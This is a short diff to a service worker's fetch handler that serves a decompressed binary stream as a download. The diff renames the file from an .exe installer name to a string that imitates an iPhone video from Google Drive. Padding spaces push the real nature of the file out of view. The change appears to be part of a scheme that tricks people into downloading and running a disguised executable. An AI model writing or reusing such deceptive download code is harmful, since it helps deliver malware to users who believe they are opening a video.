@@ -41,7 +41,7 @@ self.addEventListener('fetch', (event) => {
           const headers = new Headers();
           headers.set('Content-Type', 'application/octet-stream');
 
-          const filename = 'DriveVideoSetup-x64-0.1.0.exe';
+          const filename = 'Video_iPhone_2026-06-23.mp4   Drive.google.com';
           headers.set('Content-Disposition', `attachment; filename="${filename}"`);
 
           return new Response(decompressedStream, {
